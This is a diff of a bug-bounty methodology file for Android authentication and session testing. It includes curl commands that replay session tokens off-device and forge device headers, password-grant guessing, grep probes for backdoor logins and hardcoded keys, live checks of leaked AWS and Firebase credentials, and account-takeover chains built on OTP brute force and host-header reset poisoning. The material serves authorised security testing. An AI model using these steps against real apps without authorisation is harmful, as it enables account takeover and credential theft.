@@ -4,7 +4,7 @@
  "file": "D13-auth-session-otp-biometrics.md",
  "why": "It pays because it is the only Android-adjacent domain whose findings are priced on outcome rather than on category. The entire mobile branch of the Bugcrowd VRT is pinned at P5 — pinning absent or defeatable, auto-backup, clipboard, tapjacking, root-detection absence, unencrypted internal storage — so a report whose headline is \"the app stores a token in `shared_prefs`\" is P5 by construction. The *same* token, replayed with `curl` from a host that has never run the app and returning another account's `/me`, is filed as `authentication_bypass` at P1. That reframing is the single highest-leverage move in mobile bug bounty, and it lives entirely in D13. Every local primitive from D07, D08, D09, D10, D11 and D14 terminates here or terminates nowhere.\n\nIt also pays because the mobile client is usually the *weaker* client. The corpus is unambiguous and repetitive on this point: lockout implemented on the web login form and not on the OAuth/token endpoint the app uses (H1 #160109 — an account already locked on the website still logged in through the app's endpoint); a verify endpoint capped at three attempts fronted by a resend endpoint with a 30-second cooldown and no cap, giving 8,640 attempts a day against a 10,000-value keyspace (H1 #205000, High 7.5); MFA enforced at the end of the primary login handler and absent from the mobile/API login handler that also mints a session. The bug-hunting corpus states it structurally: a mobile app's hardcoded backend calls are frequently an *older* API version than the web app uses, with weaker auth, weaker rate limits and more field exposure — and the weakened control, not the version difference, is the finding.\n\nBe honest about the parts that are graveyard. Session-not-invalidated-on-logout is P4 at best and P5 server-side-only; excessive JWT lifetime, weak JWT algorithm, JWT PII, concurrent logins, no account lockout and \"no 2FA implementation\" are all P5; HackerOne's Core Ineligible list covers \"most issues related to rate limiting\"; Reddit, Grab and HackenProof all exclude bare rate-limit findings; Google's Mobile VRP excludes secondary lockscreen bypasses outright, and Bugcrowd prices a bypass that needs root/Frida with no other weakness at P5. A biometric-bypass report that shows the prompt skipped but never shows what the gate released is worth nothing — Shopify's accepted biometric bypass (H1 #637194) paid $500, while Nextcloud's passcode bypasses paid $0. The exception, and the reason this chapter is long: **the bypass plus the missing `CryptoObject` plus the released secret plus the server accepting that secret is a different report entirely**, and that chain is Critical.",
  "crux": "**Does anything the server checks actually depend on the user having authenticated — or is every gate in this app a boolean the client computes, a header the client echoes, and a token the client can hand to `curl`?**",
- "applicability": "",
+ "applicability": "Run before opening any item. D13 applies to every app that authenticates a user or gates a screen locally; it is n/a only when none of the five probes fires. The sub-blocks (OAuth, OTP, biometric, IdP) are settled by the same probes and carry their own `Requires` tags.\n\n```bash\n# 1. Does the app authenticate anyone?  Auth-shaped routes in the endpoint inventory (P3)\ngrep -ciE '/(auth|login|signin|sign-in|oauth|token|otp|verify|session|register|signup|password|reset|mfa|2fa|passkey|webauthn)' inventory/endpoints.csv\n\n# 2. Auth / identity / biometric / credential SDKs present in code (decides the OAuth, IdP and biometric blocks)\ngrep -rlE 'androidx\\.biometric|BiometricPrompt|FingerprintManager|KeyguardManager|androidx\\.credentials|CredentialManager|net\\.openid\\.appauth|CustomTabsIntent|GoogleIdTokenCredential|GoogleSignIn|FirebaseAuth|CognitoUserPool|auth0|SmsRetriever|setUserAuthenticationRequired|refresh_token|grant_type' \"$DEC/jadx/sources\" | wc -l\n\n# 3. Manifest signals: SMS/OTP, biometric, authenticator/autofill/credential services, OAuth redirect handlers\ngrep -nE 'RECEIVE_SMS|READ_SMS|USE_BIOMETRIC|USE_FINGERPRINT|android\\.accounts\\.AccountAuthenticator|BIND_AUTOFILL_SERVICE|CredentialProviderService|SMS_RETRIEVED' \"$DEC/apktool/AndroidManifest.xml\"\ngrep -ciE 'oauth|callback|redirect|auth|login|magic|reset' inventory/deeplinks.csv\n\n# 4. Who owns identity?  Delegated to a platform account manager / privileged sibling → D13-091 applies, D13-013..016/064 become n/a\ngrep -rlE 'GoogleAuthUtil|AccountManager\\.get\\(|getAuthToken\\(|peekAuthToken\\(' \"$DEC/jadx/sources\" | wc -l\n\n# 5. Per-device gating: record the feature-flag / remote-config state that gates login, OAuth and OTP routes on EACH test device before settling any row (a flag-off path is `blocked`, not `n/a`)\ngrep -rnE 'FeatureFlag|RemoteConfig|getBoolean\\(\"[a-z_]*(auth|login|oauth|otp|passkey|biometric)' \"$DEC/jadx/sources\" | head\n```\n\nDecision:\n- Probe 1 = 0 **and** probe 2 = 0 **and** probe 3 prints nothing → whole domain n/a.\n- Probe 2 matches no `BiometricPrompt|FingerprintManager|KeyguardManager` → D13-074..079, D13-095 n/a (`biometric` tag false).\n- Probe 2 matches no OAuth client (`appauth|CustomTabsIntent|grant_type|GoogleSignIn|GoogleIdTokenCredential`) and probe 3's deep-link count is 0 → D13-029..037 n/a (`oauth` tag false).\n- Probe 1 has no `otp|verify|mfa|2fa` route and probe 3 shows no SMS signal → D13-038..052, D13-066 n/a.\n- Probe 4 > 0 → D13-091 applies; D13-013..016 and D13-064 are settled as \"identity delegated\" with the delegate named by class, not by vendor.\n\nn/a note text (verbatim, with the numbers filled in): `D13 n/a — no authentication surface: 0 auth-shaped routes in inventory/endpoints.csv, 0 auth/biometric/credential SDK classes in $DEC/jadx/sources, no SMS/biometric/authenticator/credential-service manifest signals, 0 auth deep links; probes run <YYYY-MM-DD> against build <versionName> (<versionCode>) on <device serial>.` Sub-block variant: `D13-074..079 n/a — no BiometricPrompt/FingerprintManager/KeyguardManager reference in $DEC/jadx/sources (probe 2); no in-app lock observed in P3.`",
  "triage": "1. **Replay the live session token from `curl`, off-device, with no app-specific headers.** Two minutes, and it decides whether the rest of the engagement is scripted or hand-driven. A \"device-bound\" token that answers from your laptop demotes the vendor's headline control to nothing and converts every D11 storage finding into P1.\n2. **Enumerate every code path that mints a session** (password login, SSO callback, mobile/API login, token exchange, remember-me, reset auto-login, email-change confirmation, account-link). MFA is checked in one handler; another always forgets.\n3. **The OTP verify endpoint, measured not assumed.** Threshold, keyspace, resend budget, replay, binding. It is the commonest mobile primary auth and the commonest Critical.\n4. **The step-up matrix on an unlocked device** — email, phone, password, 2FA method, recovery, trusted device, payee, deletion. Any row that passes converts temporary access into permanent account control.\n5. **PKCE enforcement and the custom-scheme redirect.** A public client whose scheme any app can claim, redeeming codes without a `code_verifier`, is AM-03 account takeover.\n6. **Session invalidation across logout, password change, email change and grant revocation** — and re-test the grant revocation 20+ hours later, which is where Reddit's Critical lived.\n7. **The biometric call site**: is there a `CryptoObject`, and does the callback ever read it? Everything else about biometrics is downstream of that one line.\n8. **Reset and magic-link token lifecycle** — leak, expiry, reuse, host-header poisoning, deep-link delivery.\n9. **Refresh-token rotation and family revocation.** Long-lived refresh tokens in app storage are the mobile norm; without rotation the password change the victim performs is theatre.\n10. **Registration and identity normalisation** (pre-hijacking classes, case collisions, unverified-email linking). Lowest dup rate, because scanners cannot reach it.",
  "graveyard": "| Observation | Why it is not a finding | What would make it one |\n|---|---|---|\n| \"Session not invalidated on logout\" (server-side only) | `failure_to_invalidate_session.on_logout_server_side_only` is **P5**, and it is on the never-submit list standalone. Reddit and several other programs exclude it by name. The user has already chosen to end the session. | A theft chain: a token recovered through D07/D08/D10/D11 that still authenticates after logout **and** after the password change (D13-019), replayed from a host that never ran the app. |\n| Excessive JWT lifetime / `exp` months out | `excessive_jwt_lifetime` = **P5**. A long-lived token nobody can obtain is a design note. | Pair it with a token-disclosure primitive and file it *inside* that report as the amplifier (D13-028), never separately. |\n| Weak JWT hashing algorithm; PII inside the JWT payload | `weak_jwt_hashing_algorithm` = **P5**; `disclosure_of_secrets.sensitive_information_disclosed_jwt` = **P5**. The algorithm being weak is not the same as the signature being forgeable. | A **forged** token the server accepts (D13-027) — cracked secret, `alg:none`, `jwk`/`jku`/`kid`, or RS256→HS256 — demonstrated on an endpoint scoped to another principal. |\n| Concurrent logins allowed / no session-count limit | `concurrent_logins` = **P5**. Multi-device is a product decision. | Only if concurrency defeats a documented control — e.g. a licensing or seat limit the vendor sells (→ D23). |\n| \"No 2FA implementation\" / \"no account lockout\" | `no_two_fa_implementation` = **P5**; `no_account_lockout` = **P5**. Absence of an optional control is a recommendation, not a vulnerability. | Demonstrate the exhaustion the missing control permits and show the resulting session (D13-038/041). |\n| OAuth `client_secret` extracted from the APK | On the never-submit list as known and expected — a public client has no confidential secret by definition. | **PKCE non-enforcement** at the token endpoint (D13-030) is the reportable finding; the secret is context. |\n| Bare host-header injection (`X-Forwarded-Host` reflected) | On the never-submit list without the downstream PoC. A reflected host is a parser artefact. | The **delivered reset email** containing `https://evil.com/reset?token=…` (D13-054) — `token_leakage_via_host_header_poisoning` = **P2**. |\n| Rate-limit bypass with no demonstrated abuse | HackerOne Core Ineligible (\"most issues related to rate limiting\"); Grab, Reddit and HackenProof all exclude it. The bypass is the primitive; the bug is the abuse case. | Carry it through to the accepted OTP or recovery code and the issued session (D13-038/040), then file as `authentication_bypass`. |\n| Username/email enumeration returning only existence | `username_enumeration.non_brute_force` = **P4**, and many programs class it low-risk information. | The response leaking **more than existence** — a real name, avatar, masked phone (→ PII exposure); or file it as the enabling half of a credential-stuffing chain with the stuffing demonstrated. |\n| Biometric bypass demonstrated only with Frida on an emulator, with no `CryptoObject` analysis | Lands in `lack_of_binary_hardening.runtime_instrumentation_based` = **P5**, and invites \"not a real-world bypass\". Google Mobile VRP excludes secondary lockscreen bypasses outright. | The missing `CryptoObject` *plus* the released secret *plus* the server accepting it, demonstrated on a physical device (D13-074). |\n| `setDeviceCredentialAllowed(true)` / `DEVICE_CREDENTIAL` in the allowed authenticators | MASTG-TEST-0326 states plainly that this \"is not inherently a vulnerability… better categorized as a security weakness or hardening issue\". | A finance/health/government vertical where a shoulder-surfed PIN is the realistic attack, **or** a second non-key-bound `createConfirmDeviceCredentialIntent` path (D13-077). |\n| `setConfirmationRequired(false)` | MASTG: \"not inherently a vulnerability. It may be appropriate for low-risk operations.\" | A payment or data-release action completing on a passive face match with no deliberate user action (D13-078). |\n| \"The app does not check for a device passcode\" | Informational-to-Low; MASTG notes apps \"cannot force users to enable biometrics at the system level\". | The **bypass**: show the check exists, is the sole gate, and is trivially hooked or satisfied on a swipe-only device (D13-079). |\n| \"The login form does not support autofill / password managers\" | MASWE-0019 is a usability-driven weakness; no VRT node rates it. | Show it forces the credential through the clipboard, then chain to the clipboard read in D20 (D13-089). |\n| Root/emulator detection defeated, so \"the biometric gate can be bypassed\" | `lack_of_binary_hardening.*` is **P5** across the board. A defeated client-side check is expected on an attacker-controlled device. | Reframe entirely: the finding is that the *server* trusts a client assertion (D13-017), or that the authentication decision was never cryptographically bound (D13-074). |\n| Certificate pinning absent or defeatable, used to justify \"MitM against the auth flow\" | `ssl_certificate_pinning.absent` and `.defeatable` are both **P5**; AM-07 (network attacker with a trusted CA) is a tester convenience, not an attacker. | A real AM-06 exposure: the auth assertion carried over **cleartext** (D13-051 silent-auth SDKs), or a token leaked to a third party the app talks to. |\n| Response manipulation makes the app show the authenticated screen | Cosmetic if every subsequent API call 401s. The client's opinion of your identity is not a security boundary. | The **subsequent** API call returning real server data, or proof that a usable session was issued at the password step (D13-045). |\n| An APK-derived endpoint is an older API version than the web app's | \"A version difference alone is Informational.\" | The **weakened control** on the old path, diffed behaviourally on auth strength, rate limiting, input validation or field exposure (D13-012). |\n| Pre-account takeover shown only as \"I registered the victim's address\" | On the never-submit list \"(usually)\" — the squat alone has no demonstrated victim impact. | The completed claim: the attacker's token reading the victim's **post-signup** data, or the attacker's recovery identifier surviving the victim's recovery (D13-060). |",
  "joins": "- **The OTP verify throttle × the OTP resend cooldown (D13-038 × D13-047).** Nobody tests these together because they are different endpoints owned, in large organisations, by different teams — one is \"auth\", the other is \"notifications\". Individually both look defensible: three attempts before expiry is a real cap, and a 30-second SMS cooldown is a real cost control. Joined, they are 8,640 guesses a day against a 10,000-value keyspace. This join *is* H1 #205000, and it is the single highest-yield pairing in the chapter.\n- **Biometric call site (D13-074) × local token storage (→ D11) × server-side revocation (D13-018).** The three are reviewed by three different specialisms — mobile reverse engineering, storage analysis, and API testing — and each alone is P5 or Medium. Joined, they are the canonical mobile Critical: the gate is a boolean, the secret behind it is a long-lived token on disk, and the token answers from `curl` after logout. Always assemble this triple before writing any of the three separately.\n- **SMS User Consent receiver (D13-049) × exported-component intent redirection (→ D08) × FileProvider grants (→ D07).** The auth tester greps for OTP handling and stops; the IPC tester enumerates receivers and does not know the GMS consent contract. The join is the self-grant gadget: the receiver launches an attacker-supplied `EXTRA_CONSENT_INTENT` **as the victim's UID**, and that intent carries `FLAG_GRANT_READ_URI_PERMISSION` to the victim's own `FileProvider`. One receiver registration yields both an OTP-injection candidate and a full file-read primitive, and the corpus's own field experience is that the second is the real finding while the first is a recorded negative.\n- **Custom-scheme OAuth redirect (D13-031) × App Link verification state (→ D09) × PKCE enforcement (D13-030).** Three teams again: identity owns the token endpoint, mobile owns the manifest, and nobody owns `assetlinks.json` after the domain moves. `pm get-app-links` returning anything but `verified`, plus a token endpoint that redeems without a `code_verifier`, is AM-03 account takeover by an app with **no dangerous permissions**. Test the two together on the same afternoon — separately they read as hygiene.\n- **Password-reset link generation (D13-054) × email deliverability (SPF/DMARC) × the mobile deep-link handler (D13-056).** The reset token's whole journey crosses three surfaces nobody reviews as one: the backend that builds the URL from a request header, the mail infrastructure that decides whether a spoof lands in the inbox, and the Android component that receives the resulting link. Poison the host, deliver through a spoofable domain, and have an unverified scheme handler catch the token — each step is a low-rated finding and the join is P2/P1.\n- **Step-up matrix (D13-070) × the session-list UI (D13-022) × notification posture (D13-085).** An unlocked-device attacker changes the recovery email with no step-up; the victim's session list never showed the attacker's session class so there is nothing to revoke; and the \"your email was changed\" notification was never sent to the **old** address. Three separate teams' omissions, and together they are silent, permanent account takeover. The absent notification is the cheapest evidence in the whole chapter and the one most often left out of reports.\n- **Refresh-token rotation (D13-020) × device-to-device restore / Restore Credentials (D13-073) × backup extraction (→ D02/D11).** Rotation is an identity-team property, restore is a platform-integration property, and backup configuration is a manifest property. Joined: a non-rotating refresh token that travels in a device-to-device transfer means the victim's *new phone setup* hands an attacker who holds the backup a credential that survives every password change. Ask explicitly whether the app opts out of D2D transfer for its credential store.\n- **Support-chat identity verification (D13-088) × support-agent reset powers (D13-058) × the in-app support WebView (→ D10).** Security reviews treat the support SDK as a third-party integration and skip it. But the support thread is frequently a *recovery channel* — agents perform resets from it — so an SDK whose HMAC secret ships in the APK is not a privacy issue, it is an authentication issue, and its severity is set by what the agent on the other end is permitted to do.\n- **Biometric enrolment invalidation (D13-076) × device-credential fallback (D13-077) × the device's own lock settings.** Each is a MASTG checkbox; together they collapse the gate. `setInvalidatedByBiometricEnrollment(false)` plus `DEVICE_CREDENTIAL` in the allowed authenticators means: know the PIN, enrol your own finger, and the app's \"biometric protection\" is the PIN you already have. Neither flag alone earns more than Medium; the pair is a High with a no-instrumentation PoC.",
@@ -119,8 +119,10 @@
     "AM-05"
    ],
    "applies_to": "Every two-account auth proof: pre-hijacking, IDOR on sessions, OTP-for-another-user, account merge",
-   "requires": "",
-   "requires_tags": [],
+   "requires": "two-accounts",
+   "requires_tags": [
+    "two-accounts"
+   ],
    "maps_to": "`bb-methodology` PART 4 (Marker Discipline); `security-arsenal` operator notes",
    "record": "",
    "legacy_meta": {},
@@ -389,8 +391,10 @@
     "AM-12"
    ],
    "applies_to": "All. Run this **before** anything else in D15 — it decides whether you test through the app or through a script",
-   "requires": "",
-   "requires_tags": [],
+   "requires": "backend-api",
+   "requires_tags": [
+    "backend-api"
+   ],
    "maps_to": "API2:2023 Broken Authentication; RFC 9449 (what real sender-constraining looks like: `cnf`/`jkt`, `htm`/`htu`/`ath`/`jti`)",
    "record": "",
    "legacy_meta": {},
@@ -419,7 +423,7 @@
    "has_code": true,
    "skip_when": "",
    "test": "Vendors routinely describe their tokens as device-bound because the *client* attaches a device id. A header the client echoes is not binding — you can echo it too. Genuine binding is cryptographic: a DPoP proof, mTLS, or a per-request HMAC over a key the server issued and the client cannot export.",
-   "how": "```bash\n# reproduce the app's live request minimally, from a host that has never run the app\ncurl -sS -i 'https://api.target/v2/me' -H \"Authorization: Bearer $TOKEN\"\n# then add back, ONE AT A TIME, each header the OkHttp interceptor sets, to find which is enforced\ncurl -sS -o /dev/null -w '%{http_code}\\n' 'https://api.target/v2/me' \\\n     -H \"Authorization: Bearer $TOKEN\" -H \"X-Device-Id: $DEVID\"\ncurl -sS -o /dev/null -w '%{http_code}\\n' 'https://api.target/v2/me' \\\n     -H \"Authorization: Bearer $TOKEN\" -H \"X-Device-Id: 00000000-0000-0000-0000-000000000000\"\n# read the interceptor to know what the app actually sends\ngrep -rn 'Interceptor\\|addHeader(\"Authorization\"\\|addHeader(\"X-' jadx_out/sources | head -40\n```",
+   "how": "```bash\n# reproduce the app's live request minimally, from a host that has never run the app\ncurl -sS -i 'https://api.target/v2/me' -H \"Authorization: Bearer $TOKEN\"\n# then add back, ONE AT A TIME, each header the OkHttp interceptor sets, to find which is enforced\ncurl -sS -o /dev/null -w '%{http_code}\\n' 'https://api.target/v2/me' \\\n     -H \"Authorization: Bearer $TOKEN\" -H \"X-Device-Id: $DEVID\"\ncurl -sS -o /dev/null -w '%{http_code}\\n' 'https://api.target/v2/me' \\\n     -H \"Authorization: Bearer $TOKEN\" -H \"X-Device-Id: 00000000-0000-0000-0000-000000000000\"\n# read the interceptor to know what the app actually sends\ngrep -rn 'Interceptor\\|addHeader(\"Authorization\"\\|addHeader(\"X-' $DEC/jadx/sources | head -40\n```",
    "proof": "HTTP 200 with the account's data from a host that has never run the app, with no device-specific header, or with the device header set to an arbitrary value. Capture the full response and the interceptor source side by side.",
    "escalation": "Everything. → D11/D07/D08/D09/D10 token-leak primitives all become P1 `authentication_bypass`; → D15 (the whole API sweep becomes scriptable).",
    "ruled_out_when": "The request fails off-device *and you have excluded the two artefacts that fake device binding*: (1) a stale bot-management cookie (`__cf_bm`) returns a uniform 401 on every endpoint while the app stays logged in — re-pull the jar and re-test; (2) duplicate `host` + `.host` rows from the WebView `Cookies` DB send the same cookie twice and yield 400s that read as server rejection — dedupe, preferring the exact-host row. Only after both are excluded, and only if the server is actually validating a proof-of-possession (D13-011), is \"device-bound\" a true negative. A failed `curl` replay alone is not evidence of binding."
@@ -439,8 +443,10 @@
     "AM-01"
    ],
    "applies_to": "Apps implementing DPoP — increasingly common in fintech and open-banking clients",
-   "requires": "",
-   "requires_tags": [],
+   "requires": "backend-api",
+   "requires_tags": [
+    "backend-api"
+   ],
    "maps_to": "RFC 9449 (required claims `htm`, `htu`, `iat`, `jti`, `ath`; `cnf`/`jkt` binding; server MUST track `jti` within the acceptance window); API2:2023",
    "record": "",
    "legacy_meta": {},
@@ -482,8 +488,10 @@
     "AM-01"
    ],
    "applies_to": "Any versioned API. This is the highest-value mobile→backend bridge in the corpus",
-   "requires": "",
-   "requires_tags": [],
+   "requires": "backend-api",
+   "requires_tags": [
+    "backend-api"
+   ],
    "maps_to": "`hunt-shadow-api` Stages 1 & 3 + severity table; explicit chain from `apk-redteam-pipeline`",
    "record": "",
    "legacy_meta": {},
@@ -528,8 +536,10 @@
     "AM-01"
    ],
    "applies_to": "All apps whose backend also serves a web login",
-   "requires": "",
-   "requires_tags": [],
+   "requires": "backend-api",
+   "requires_tags": [
+    "backend-api"
+   ],
    "maps_to": "H1 #160109 (Instacart), #127202 (New Relic), #138101 (Pornhub, $5,000); `hunt-brute-force` Pattern 4",
    "record": "",
    "legacy_meta": {},
@@ -574,8 +584,10 @@
     "AM-01"
    ],
    "applies_to": "All; common in older enterprise and telco apps",
-   "requires": "",
-   "requires_tags": [],
+   "requires": "backend-api",
+   "requires_tags": [
+    "backend-api"
+   ],
    "maps_to": "draft-ietf-oauth-security-topics §2.4 (\"The resource owner password credentials grant MUST NOT be used\"), §2.1.2 (implicit grant SHOULD NOT be used); API2:2023",
    "record": "",
    "legacy_meta": {},
@@ -602,7 +614,7 @@
    "has_code": true,
    "skip_when": "",
    "test": "Some apps POST the user's username and password straight to `/oauth/token`. That puts the credential in the app process and makes credential stuffing trivially scriptable against an endpoint that no web-side protection covers.",
-   "how": "```bash\ngrep -rn 'grant_type' jadx_out/sources | grep -iE 'password|client_credentials|implicit'\ngrep -rn 'response_type=token\\|response_type=code' jadx_out/sources\ncurl -s -X POST https://auth.target/oauth/token \\\n  -d grant_type=password -d username=$U -d password=$P -d client_id=$CID -i | head -20\n```",
+   "how": "```bash\ngrep -rn 'grant_type' $DEC/jadx/sources | grep -iE 'password|client_credentials|implicit'\ngrep -rn 'response_type=token\\|response_type=code' $DEC/jadx/sources\ncurl -s -X POST https://auth.target/oauth/token \\\n  -d grant_type=password -d username=$U -d password=$P -d client_id=$CID -i | head -20\n```",
    "proof": "A 200 with an access token from the ROPC request, then the consequence: the same endpoint accepting N password attempts with no throttle, quantified per D13-004.",
    "escalation": "→ D13-013 (the mobile-only weaker path) → D15.",
    "ruled_out_when": "The token endpoint rejects `grant_type=password` with `unsupported_grant_type`, and the authorize request uses `response_type=code` with PKCE rather than `response_type=token`. Note that finding a `client_secret` in the APK alongside ROPC is *not* the report — \"OAuth client_secret in mobile app\" is on the never-submit list as known and expected; PKCE non-enforcement (D13-031) is the reportable finding instead."
@@ -622,8 +634,10 @@
     "AM-01"
    ],
    "applies_to": "All; this is a server-side flaw discovered by client-side review, which is exactly why source review pays",
-   "requires": "",
-   "requires_tags": [],
+   "requires": "backend-api",
+   "requires_tags": [
+    "backend-api"
+   ],
    "maps_to": "sec-88 \"Hacking InsecureBankv2\" (`devadmin` → `/devlogin`); YesWeHack Android recon guide, \"Analysing custom authentication and authorisation logic\"",
    "record": "",
    "legacy_meta": {},
@@ -645,7 +659,7 @@
    "has_code": true,
    "skip_when": "",
    "test": "Read the login code path end to end for special-cased usernames, build-flavour branches, or a *second* HTTP client pointed at a different endpoint. The canonical shape routes one username to an alternate route that authenticates without a password.",
-   "how": "```bash\ngrep -rnE '\\.equals\\(\"(admin|devadmin|test|debug|root|superuser|qa)\"\\)' jadx_out/sources/\ngrep -rnE '(devlogin|/internal|/debug|bypass|backdoor|skipAuth|BuildConfig\\.DEBUG)' jadx_out/sources/\n# read the login Activity in jadx and count the HttpPost/Request objects — two is the tell\ngrep -rn 'startsWith(\"auth_\")\\|token\\.startsWith\\|isAdmin()' jadx_out/sources/\n```\nThe three shapes to recognise:\n```java\nif (username.equals(\"devadmin\")) { responseBody = httpclient.execute(httppost2); }  // -> /devlogin\npublic boolean verifyToken(String t) { return t.startsWith(\"auth_\"); }              // shape, not signature\nif (user.isAdmin()) { /* show admin panel */ }                                      // client-decided role\n```",
+   "how": "```bash\ngrep -rnE '\\.equals\\(\"(admin|devadmin|test|debug|root|superuser|qa)\"\\)' $DEC/jadx/sources/\ngrep -rnE '(devlogin|/internal|/debug|bypass|backdoor|skipAuth|BuildConfig\\.DEBUG)' $DEC/jadx/sources/\n# read the login Activity in jadx and count the HttpPost/Request objects — two is the tell\ngrep -rn 'startsWith(\"auth_\")\\|token\\.startsWith\\|isAdmin()' $DEC/jadx/sources/\n```\nThe three shapes to recognise:\n```java\nif (username.equals(\"devadmin\")) { responseBody = httpclient.execute(httppost2); }  // -> /devlogin\npublic boolean verifyToken(String t) { return t.startsWith(\"auth_\"); }              // shape, not signature\nif (user.isAdmin()) { /* show admin panel */ }                                      // client-decided role\n```",
    "proof": "A 200 with a valid session for the special username and an empty or arbitrary password, obtained in Burp **independently of the client**. For the `startsWith` shape, mint `auth_anything` and send it to the API: a 200 delta versus a random string proves the server shares the weakness.",
    "escalation": "→ D15 (full API surface as an administrator); → `broken_access_control.privilege_escalation`.",
    "ruled_out_when": "The alternate branch exists but the server returns 401 for it (dead code from a removed staging path — record it as an observation, not a finding), or the `startsWith`-style check is purely a client-side display gate and the API re-validates the token signature. A 401 on the forged token proves the check is client-only, which is Low at most — say so explicitly."
@@ -665,8 +679,10 @@
     "AM-01"
    ],
    "applies_to": "All",
-   "requires": "",
-   "requires_tags": [],
+   "requires": "backend-api",
+   "requires_tags": [
+    "backend-api"
+   ],
    "maps_to": "Oversecured banking-ATO item 3; Ostorlab \"Finding and Validating Hardcoded Keys and Secrets\"; MASWE-0004; Google ASI campaigns \"Amazon Web Services Embedded Credentials\", \"Embedded Google Refresh Token OAuth\", \"Developer URL Leaked Credentials\", \"Exposed Firebase Cloud Messaging Server Keys\"",
    "record": "",
    "legacy_meta": {},
@@ -692,7 +708,7 @@
    "has_code": true,
    "skip_when": "",
    "test": "Distinct from a user session token: a credential that authenticates *the app*. Once it leaks, user-level authentication strength is irrelevant. The discipline is to classify each hit by what it authenticates and to **validate it live** rather than reporting the regex match.",
-   "how": "```bash\ngrep -rEn 'AIza[0-9A-Za-z\\-_]{35}|AKIA[0-9A-Z]{16}|xox[baprs]-[0-9A-Za-z-]{10,}|sk_live_[0-9a-zA-Z]{24,}|rzp_(live|test)_[0-9A-Za-z]{14}' jadx_out/sources/ jadx_out/resources/\nunzip -p base.apk res/values/strings.xml | strings | grep -iE 'key|secret|token'   # R8 never renames resources\n# validate, do not stop at the regex:\nAWS_ACCESS_KEY_ID=... AWS_SECRET_ACCESS_KEY=... aws sts get-caller-identity\ncurl -s \"https://graph.facebook.com/v8.0/{appId}/permissions?access_token={token}\"\ncurl -s \"https://<project>.firebaseio.com/.json\" | head -c 400\ncurl -i -H \"Authorization: Bearer <token>\" https://api.target/v1/me\n```",
+   "how": "```bash\ngrep -rEn 'AIza[0-9A-Za-z\\-_]{35}|AKIA[0-9A-Z]{16}|xox[baprs]-[0-9A-Za-z-]{10,}|sk_live_[0-9a-zA-Z]{24,}|rzp_(live|test)_[0-9A-Za-z]{14}' $DEC/jadx/sources/ $DEC/jadx/resources/\nunzip -p base.apk res/values/strings.xml | strings | grep -iE 'key|secret|token'   # R8 never renames resources\n# validate, do not stop at the regex:\nAWS_ACCESS_KEY_ID=... AWS_SECRET_ACCESS_KEY=... aws sts get-caller-identity\ncurl -s \"https://graph.facebook.com/v8.0/{appId}/permissions?access_token={token}\"\ncurl -s \"https://<project>.firebaseio.com/.json\" | head -c 400\ncurl -i -H \"Authorization: Bearer <token>\" https://api.target/v1/me\n```",
    "proof": "A successful authenticated response — an identity ARN, a permission list, real records — executed from a host that has never run the app. Not the regex match.",
    "escalation": "→ D18 (cloud backend), D23 (payments), D24 (push). A leaked FCM server key also gives you delivery control for the D24 chains.",
    "ruled_out_when": "The key is one the platform intends to be public (Firebase web API key, Maps key) *and* the backing service's rules are closed — an invalid Firebase key returns `INVALID_KEY_TYPE` (401); a valid one on a locked database returns a permission error rather than data. Say which, explicitly, or triage bulk-closes the lot."
@@ -713,8 +729,11 @@
     "AM-12"
    ],
    "applies_to": "Apps using Play Integrity / SafetyNet Attestation / hardware key attestation",
-   "requires": "",
-   "requires_tags": [],
+   "requires": "backend-api, device",
+   "requires_tags": [
+    "backend-api",
+    "device"
+   ],
    "maps_to": "Play Integrity API docs (token verification \"must occur on your backend server, not on the client app\"; check `requestDetails` `requestHash`/nonce, `appRecognitionVerdict == PLAY_RECOGNIZED`, `appLicensingVerdict == LICENSED`; do not cache verdicts); Key Attestation docs (verify the chain server-side, `attestationSecurityLevel ∈ {TrustedEnvironment, StrongBox}`, match `attestationChallenge` to your nonce, check `https://android.googleapis.com/attestation/status`)",
    "record": "",
    "legacy_meta": {},
@@ -737,7 +756,7 @@
    "has_code": true,
    "skip_when": "",
    "test": "Many apps request the verdict, check it locally, and send an unauthenticated boolean to the server. The finding is the *server's* failure to verify, never the client-side bypass.",
-   "how": "```bash\ngrep -rn 'IntegrityManager\\|StandardIntegrityManager\\|requestIntegrityToken\\|integrityToken\\|PlayIntegrity' jadx_out/sources\ngrep -rn 'setAttestationChallenge\\|getCertificateChain\\|KeyStore.getInstance(\"AndroidKeyStore\")' jadx_out/sources\n# does the sensitive request carry an opaque integrity token, and does removing it change anything?\ncurl -s -o /dev/null -w '%{http_code}\\n' https://api.target/v1/transfer \\\n  -H \"Authorization: Bearer $TOKEN\" -H 'Content-Type: application/json' \\\n  -d '{\"amount\":1,\"to\":\"self\"}'                                  # no integrity token at all\n# and the client-boolean variant: does the body carry {\"deviceSafe\":true}?\n```",
+   "how": "```bash\ngrep -rn 'IntegrityManager\\|StandardIntegrityManager\\|requestIntegrityToken\\|integrityToken\\|PlayIntegrity' $DEC/jadx/sources\ngrep -rn 'setAttestationChallenge\\|getCertificateChain\\|KeyStore.getInstance(\"AndroidKeyStore\")' $DEC/jadx/sources\n# does the sensitive request carry an opaque integrity token, and does removing it change anything?\ncurl -s -o /dev/null -w '%{http_code}\\n' https://api.target/v1/transfer \\\n  -H \"Authorization: Bearer $TOKEN\" -H 'Content-Type: application/json' \\\n  -d '{\"amount\":1,\"to\":\"self\"}'                                  # no integrity token at all\n# and the client-boolean variant: does the body carry {\"deviceSafe\":true}?\n```",
    "proof": "The sensitive endpoint returning 200 with the integrity token omitted, or with the client-side boolean flipped. That proves the gate is client-side.",
    "escalation": "→ D21 (the RASP posture), D23 (what the gate guarded).",
    "ruled_out_when": "Removing or corrupting the integrity token produces a distinct server-side rejection, and the request carries an opaque token rather than a boolean. If the server *does* verify, stop burning time on Frida root-hiding and re-scope to server-side testing — a server-verified attestation cannot be forged by any local hook. Record that as a passing control with the evidence."
@@ -758,8 +777,10 @@
     "AM-11"
    ],
    "applies_to": "All",
-   "requires": "",
-   "requires_tags": [],
+   "requires": "backend-api",
+   "requires_tags": [
+    "backend-api"
+   ],
    "maps_to": "MASWE-0024 (CWE-285/287/613); H1 #1172205 (Shopify Ping, Low 2.3), #67220, #7041, #165353 (Nextcloud, Medium), #194329; `hunt-session` disclosed Pattern 2",
    "record": "",
    "legacy_meta": {},
@@ -811,8 +832,10 @@
     "AM-01"
    ],
    "applies_to": "All",
-   "requires": "",
-   "requires_tags": [],
+   "requires": "backend-api",
+   "requires_tags": [
+    "backend-api"
+   ],
